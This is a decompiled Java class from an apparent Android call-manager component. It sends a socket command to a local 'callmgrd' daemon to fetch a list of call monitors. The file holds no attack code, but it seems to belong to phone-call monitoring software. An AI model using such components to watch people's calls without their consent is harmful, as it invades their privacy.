package com.vvt.callmanager.ref.command;

import com.fx.socket.SocketCmd;
import com.vvt.callmanager.ref.MonitorList;

public class RemoteGetMonitorList
  extends SocketCmd
{
  private static final long serialVersionUID = -3230810986321702407L;
  
  public RemoteGetMonitorList(String paramString)
  {
    super(paramString, MonitorList.class);
  }
  
  protected String getServerName()
  {
    return "com.fx.socket.callmgrd";
  }
  
  protected String getTag()
  {
    return "RemoteGetMonitorList";
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/callmgr/classes-enjarify.jar!/com/vvt/callmanager/ref/command/RemoteGetMonitorList.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */